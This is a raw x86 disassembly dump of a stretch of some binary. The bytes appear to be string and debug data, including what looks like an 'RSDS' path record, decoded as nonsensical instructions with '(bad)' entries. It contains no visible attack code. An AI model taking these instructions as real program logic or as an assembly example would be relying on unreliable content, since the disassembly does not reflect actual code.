  42a43a:	xor    dh,BYTE PTR [edi]
  42a43c:	pop    edi
  42a43d:	xor    DWORD PTR [ebx+0x45],eax
  42a440:	add    BYTE PTR [eax+0x30],bl
  42a443:	dec    edi
  42a444:	pop    edi
  42a445:	push   eax
  42a446:	xor    BYTE PTR [ebx],dh
  42a448:	pop    ecx
  42a449:	xor    eax,0x57585f
  42a44e:	push   edi
  42a44f:	dec    ebx
  42a450:	aaa    
  42a451:	cmp    DWORD PTR [edi+0x50],ebx
  42a454:	dec    ecx
  42a455:	push   edi
  42a456:	pop    edi
  42a457:	cmp    DWORD PTR [edx],esi
  42a459:	dec    esp
  42a45a:	add    BYTE PTR [edi+0x54],cl
  42a45d:	xor    ebx,DWORD PTR [edi+0x43]
  42a460:	pop    eax
  42a461:	inc    edx
  42a462:	xor    BYTE PTR [edi+0x32],bl
  42a465:	aaa    
  42a466:	cmp    BYTE PTR [eax],dh
  42a468:	dec    esp
  42a469:	add    BYTE PTR [edx+0x32],al
  42a46c:	inc    ecx
  42a46d:	pop    edi
  42a46e:	pop    ecx
  42a46f:	inc    ebx
  42a470:	xor    eax,0x32335f37
  42a475:	inc    esp
  42a476:	add    BYTE PTR [esi+0x4b],cl
  42a479:	xor    eax,0x5158565f
  42a47e:	xor    al,0x5f
  42a480:	dec    ecx
  42a481:	inc    edx
  42a482:	aaa    
  42a483:	aaa    
  42a484:	add    BYTE PTR [ecx+0x41],cl
  42a487:	aaa    
  42a488:	pop    edi
  42a489:	push   edx
  42a48a:	pop    ecx
  42a48b:	xor    edx,DWORD PTR [edx+0x48]
  42a48e:	pop    edi
  42a48f:	inc    ebp
  42a490:	dec    esp
  42a491:	dec    ecx
  42a492:	inc    ecx
  42a493:	add    BYTE PTR ss:[edx+0x34],dl
  42a497:	dec    ebx
  42a498:	aaa    
  42a499:	pop    edi
  42a49a:	inc    ecx
  42a49b:	dec    edx
  42a49c:	inc    esp
  42a49d:	pop    edi
  42a49e:	xor    BYTE PTR [esi],dh
  42a4a0:	pop    eax
  42a4a1:	inc    edi
  42a4a2:	xor    DWORD PTR [ebx+0x0],ecx
  42a4a5:	dec    edi
  42a4a6:	xor    DWORD PTR ss:[ecx],esi
  42a4a9:	pop    edi
  42a4aa:	xor    eax,0x304e4f58
  42a4af:	cmp    DWORD PTR [esi+0x0],eax
  42a4b2:	dec    esp
  42a4b3:	dec    edx
  42a4b4:	cmp    BYTE PTR [edi+0x36],bl
  42a4b7:	xor    BYTE PTR [edi+0x36],dl
  42a4ba:	cmp    BYTE PTR [eax],al
  42a4bc:	pop    edx
  42a4bd:	xor    al,BYTE PTR [edx+0x5f]
  42a4c0:	push   esp
  42a4c1:	pop    edx
  42a4c2:	xor    eax,0x4b003955
  42a4c7:	cmp    DWORD PTR [ecx+0x5f],ebx
  42a4ca:	cmp    BYTE PTR [ecx],dh
  42a4cc:	push   edi
  42a4cd:	inc    ecx
  42a4ce:	pop    edi
  42a4cf:	push   edi
  42a4d0:	dec    esp
  42a4d1:	ss pop edi
  42a4d3:	dec    ecx
  42a4d4:	inc    esp
  42a4d5:	add    BYTE PTR [edx+0x56],al
  42a4d8:	xor    DWORD PTR [edi+0x43],ebx
  42a4db:	push   eax
  42a4dc:	inc    esi
  42a4dd:	inc    ebp
  42a4de:	pop    edi
  42a4df:	push   esi
  42a4e0:	add    BYTE PTR [ebx+eax*2+0x53],dl
  42a4e4:	pop    edi
  42a4e5:	xor    cl,BYTE PTR [esi+0x33]
  42a4e8:	pop    edi
  42a4e9:	push   esi
  42a4ea:	add    BYTE PTR [esi+0x43],al
  42a4ed:	xor    BYTE PTR [edi],dh
  42a4ef:	pop    edi
  42a4f0:	push   edx
  42a4f1:	dec    esp
  42a4f2:	pop    ecx
  42a4f3:	pop    edi
  42a4f4:	inc    edi
  42a4f5:	dec    ebx
  42a4f6:	inc    ebp
  42a4f7:	add    BYTE PTR [ebp+0x31],al
  42a4fa:	aaa    
  42a4fb:	pop    edi
  42a4fc:	push   ebp
  42a4fd:	push   edx
  42a4fe:	dec    ebx
  42a4ff:	aaa    
  42a500:	pop    edi
  42a501:	xor    dl,BYTE PTR [edx+0x0]
  42a504:	push   edx
  42a505:	xor    DWORD PTR [edi+0x32],edx
  42a508:	xor    al,0x5f
  42a50a:	inc    ebx
  42a50b:	inc    ecx
  42a50c:	push   edi
  42a50d:	dec    edx
  42a50e:	pop    edi
  42a50f:	push   esi
  42a510:	dec    esp
  42a511:	inc    esi
  42a512:	add    BYTE PTR [ebp+0x45],al
  42a515:	push   ebp
  42a516:	pop    edi
  42a517:	dec    edi
  42a518:	dec    esp
  42a519:	aaa    
  42a51a:	pop    edi
  42a51b:	dec    esi
  42a51c:	add    BYTE PTR ss:[edi+0x44],cl
  42a520:	pop    ecx
  42a521:	pop    edi
  42a522:	dec    ebp
  42a523:	inc    edx
  42a524:	pop    ecx
  42a525:	push   esi
  42a526:	add    BYTE PTR [edx+0x36],al
  42a529:	ss pop edi
  42a52b:	aaa    
  42a52c:	inc    esp
  42a52d:	xor    DWORD PTR [eax+0x50],edx
  42a530:	xor    eax,0x494a5200
  42a535:	pop    edi
  42a536:	dec    eax
  42a537:	push   ebp
  42a538:	xor    BYTE PTR [edi+0x30],bl
  42a53b:	add    BYTE PTR [ecx+0x4d],bl
  42a53e:	pop    eax
  42a53f:	pop    edi
  42a540:	push   eax
  42a541:	inc    esp
  42a542:	dec    ebp
  42a543:	aaa    
  42a544:	inc    edi
  42a545:	pop    edi
  42a546:	push   ecx
  42a547:	push   ebx
  42a548:	add    BYTE PTR [ecx+0x0],dl
  42a54b:	dec    edi
  42a54c:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42a550:	add    BYTE PTR [ecx+0x0],bl
  42a553:	xor    BYTE PTR [eax],al
  42a555:	push   ebx
  42a556:	add    BYTE PTR [edi],dh
  42a558:	add    BYTE PTR [ebp+0x0],dl
  42a55b:	add    BYTE PTR [eax],al
  42a55d:	inc    ecx
  42a55e:	add    BYTE PTR [esi+0x0],cl
  42a561:	push   ebp
  42a562:	add    BYTE PTR [edx],dh
  42a564:	add    BYTE PTR [edi+0x0],bl
  42a567:	inc    edi
  42a568:	add    BYTE PTR [eax+eax*1],dh
  42a56b:	dec    ebp
  42a56c:	add    BYTE PTR [eax],dh
  42a56e:	add    BYTE PTR [edi+0x0],bl
  42a571:	inc    esi
  42a572:	add    BYTE PTR [esi],dh
  42a574:	add    BYTE PTR [eax],al
  42a576:	add    BYTE PTR [ebx+0x0],al
  42a579:	dec    ecx
  42a57a:	add    BYTE PTR [eax],dh
  42a57c:	add    BYTE PTR [edi+0x0],bl
  42a57f:	push   ecx
  42a580:	add    BYTE PTR [edx+0x0],dl
  42a583:	add    BYTE PTR ss:[ebx+0x0],dl
  42a587:	pop    edi
  42a588:	add    BYTE PTR [eax+eax*1+0x4c],al
  42a58c:	add    BYTE PTR [eax+eax*1+0x50],cl
  42a590:	add    BYTE PTR [eax],al
  42a592:	add    BYTE PTR [edx+0x0],bl
  42a595:	xor    BYTE PTR [eax],al
  42a597:	add    BYTE PTR ss:[edi+0x0],bl
  42a59b:	dec    esp
  42a59c:	add    BYTE PTR [ebx+0x0],dl
  42a59f:	dec    ebx
  42a5a0:	add    BYTE PTR [ebx+0x0],dl
  42a5a3:	add    BYTE PTR [eax],al
  42a5a5:	dec    edx
  42a5a6:	add    BYTE PTR [ebx],dh
  42a5a8:	add    BYTE PTR [ecx],dh
  42a5aa:	add    BYTE PTR ds:0x5f003500,dh
  42a5b0:	add    BYTE PTR [esi+0x0],dl
  42a5b3:	push   ebx
  42a5b4:	add    BYTE PTR [eax+0x0],bl
  42a5b7:	add    BYTE PTR [eax],al
  42a5b9:	inc    esp
  42a5ba:	add    BYTE PTR [ecx+0x0],al
  42a5bd:	inc    ebx
  42a5be:	add    BYTE PTR ds:0x5f003600,dh
  42a5c4:	add    BYTE PTR [ebx+0x0],al
  42a5c7:	xor    eax,0x36003700
  42a5cc:	add    BYTE PTR [eax],al
  42a5ce:	add    BYTE PTR [eax+eax*1+0x54],cl
  42a5d2:	add    BYTE PTR [eax],dh
  42a5d4:	add    BYTE PTR [ebx],dh
  42a5d6:	add    BYTE PTR [eax+eax*1],dh
  42a5d9:	pop    edi
  42a5da:	add    BYTE PTR [eax],dh
  42a5dc:	add    BYTE PTR [eax+0x0],cl
  42a5df:	xor    eax,0x3000
  42a5e4:	add    BYTE PTR [edx+0x0],cl
  42a5e7:	push   ecx
  42a5e8:	add    BYTE PTR [eax+eax*1+0x5f],al
  42a5ec:	add    BYTE PTR [ebx],dh
  42a5ee:	add    BYTE PTR [ecx],dh
  42a5f0:	add    BYTE PTR [esi+0x0],al
  42a5f3:	cmp    BYTE PTR [eax],al
  42a5f5:	pop    edi
  42a5f6:	add    BYTE PTR [ecx],bh
  42a5f8:	add    BYTE PTR [esi+0x0],dl
  42a5fb:	xor    BYTE PTR [eax],al
  42a5fd:	push   ecx
  42a5fe:	add    BYTE PTR [esi],dh
  42a600:	add    BYTE PTR [eax],al
  42a602:	add    BYTE PTR [ecx+0x0],dl
  42a605:	push   esi
  42a606:	add    BYTE PTR [edi+0x0],cl
  42a609:	xor    al,0x0
  42a60b:	pop    edi
  42a60c:	add    BYTE PTR [eax+eax*1+0x52],cl
  42a610:	add    BYTE PTR [eax+0x0],bl
  42a613:	add    BYTE PTR [eax],al
  42a615:	dec    ecx
  42a616:	add    BYTE PTR [ebp+0x0],cl
  42a619:	push   ebx
  42a61a:	add    BYTE PTR [edi+0x0],bl
  42a61d:	add    BYTE PTR ss:[edi+0x0],al
  42a621:	add    BYTE PTR ss:[eax+eax*1],dh
  42a625:	push   edi
  42a626:	add    BYTE PTR [eax],al
  42a628:	add    BYTE PTR [edi+0x0],al
  42a62b:	xor    DWORD PTR [eax],eax
  42a62d:	dec    ebp
  42a62e:	add    BYTE PTR [edi+0x0],bl
  42a631:	inc    ecx
  42a632:	add    BYTE PTR [ebx+0x0],cl
  42a635:	dec    ecx
  42a636:	add    BYTE PTR [edi+0x0],bl
  42a639:	xor    BYTE PTR [eax],al
  42a63b:	inc    edi
  42a63c:	add    BYTE PTR [ebx],dh
  42a63e:	add    BYTE PTR [eax+eax*1+0x0],dl
  42a642:	add    BYTE PTR [edi+0x0],al
  42a645:	xor    BYTE PTR [eax],al
  42a647:	dec    ebx
  42a648:	add    BYTE PTR [edi+0x0],bl
  42a64b:	aaa    
  42a64c:	add    BYTE PTR [ebp+0x0],dl
  42a64f:	inc    ebx
  42a650:	add    BYTE PTR [ebp+0x0],cl
  42a653:	dec    ebx
  42a654:	add    BYTE PTR [edi+0x0],bl
  42a657:	xor    al,0x0
  42a659:	inc    ebp
  42a65a:	add    BYTE PTR [ebx+0x0],al
  42a65d:	add    BYTE PTR [eax],al
  42a65f:	dec    edx
  42a660:	add    BYTE PTR [esi+0x0],al
  42a663:	inc    esp
  42a664:	add    BYTE PTR [edi+0x0],bl
  42a667:	inc    esi
  42a668:	add    BYTE PTR [edx+0x0],dl
  42a66b:	push   edx
  42a66c:	add    BYTE PTR [ebx+0x0],dl
  42a66f:	add    BYTE PTR [eax],al
  42a671:	add    BYTE PTR [edx+0x53],dl
  42a674:	inc    esp
  42a675:	push   ebx
  42a676:	std    
  42a677:	in     eax,dx
  42a678:	xchg   esi,eax
  42a679:	dec    ebp
  42a67a:	mov    bh,0x52
  42a67c:	fs inc eax
  42a67e:	(bad)  
  42a67f:	jecxz  0x42a6ba
  42a681:	sahf   
  42a682:	jp     0x42a690
  42a684:	pop    ebx
  42a685:	aam    0x1d
  42a687:	add    BYTE PTR [eax],al
  42a689:	add    BYTE PTR [ecx+0x3a],cl
  42a68c:	pop    esp
  42a68d:	push   eax
  42a68e:	inc    edi
  42a68f:	jp     0x42a704
  42a691:	outs   dx,DWORD PTR ds:[esi]
  42a692:	inc    esi
  42a693:	outs   dx,BYTE PTR ds:[esi]
  42a694:	gs pop esp
  42a696:	gs jo  0x42a712
  42a699:	arpl   WORD PTR [edi+edx*2+0x62],sp
  42a69d:	outs   dx,BYTE PTR ds:[esi]
  42a69e:	jne    0x42a70c
  42a6a0:	dec    eax
  42a6a1:	push   esp
  42a6a2:	imul   ebp,DWORD PTR [ebp+0x5c],0x71646466
  42a6a9:	dec    ebx
  42a6aa:	jo     0x42a6fc
  42a6ac:	pop    esp
  42a6ad:	gs jbe 0x42a722
  42a6b0:	js     0x42a713
  42a6b2:	inc    ecx
  42a6b3:	outs   dx,DWORD PTR ds:[esi]
  42a6b4:	arpl   WORD PTR [edi+0x51],dx
  42a6b7:	pushw  0x5c
  42a6ba:	dec    di
  42a6bc:	push   ebx
  42a6bd:	arpl   WORD PTR [esi+0x65],sp
  42a6c0:	bound  ecx,QWORD PTR [ecx+0x79]
  42a6c3:	jbe    0x42a72e
  42a6c5:	outs   dx,BYTE PTR ds:[esi]
  42a6c6:	cs jo  0x42a72d
  42a6c9:	bound  eax,QWORD PTR [eax]
